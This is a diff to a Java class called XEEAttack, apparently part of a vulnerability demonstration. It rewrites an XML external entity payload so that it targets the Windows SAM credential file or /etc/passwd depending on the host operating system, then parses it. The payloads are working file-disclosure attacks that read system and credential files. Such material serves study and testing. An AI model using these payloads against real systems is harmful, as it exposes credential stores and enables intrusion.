@@ -28,9 +28,22 @@ public class XEEAttack implements Attack {
             DocumentBuilder builder = factory.newDocumentBuilder();
 
             System.out.println("Step 2: Creating malicious XML");
-            String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-                    + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"
-                    + "<foo>&xxe;</foo>";
+            String osName = System.getProperty("os.name").toLowerCase();
+
+            String maliciousXml;
+
+            if (osName.contains("win")) {
+                maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                        + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/config/SAM\" >]>"
+                        + "<foo>&xxe;</foo>";
+            } else if (osName.contains("nix") || osName.contains("nux") || osName.contains("mac")) {
+                maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                        + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"
+                        + "<foo>&xxe;</foo>";
+            } else {
+                System.out.println("Unsupported operating system.");
+                return;
+            }
 
             System.out.println("Step 3: Parsing the malicious XML");
             Document document = builder.parse(new InputSource(new StringReader(maliciousXml)));
